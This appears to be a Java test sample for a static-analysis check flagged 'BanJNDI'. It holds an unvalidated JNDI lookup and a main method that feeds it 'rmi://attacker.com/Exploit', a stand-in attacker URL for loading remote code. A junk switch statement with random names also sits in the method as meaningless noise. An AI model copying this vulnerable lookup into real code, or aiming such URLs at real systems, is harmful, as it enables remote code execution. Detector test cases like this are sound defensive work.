import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;

class JndiExample {

    public String showBug(String jndiName) throws NamingException {
        Context ctx = new InitialContext();
        int kqrrvaeg = 0;switch  (kqrrvaeg) {case 1:long cxnliunc = -319035398;break;default:short mcxmdptk = 561;break;}
        Object obj = ctx.lookup(jndiName); // BUG: BanJNDI
        return obj.toString();
    
}

    public static void main(String[] args) {
        try {
            JndiExample example = new JndiExample();
            String result = example.showBug("rmi://attacker.com/Exploit");
            System.out.println(result);
        } catch (NamingException e) {
            e.printStackTrace();
        }
    }
}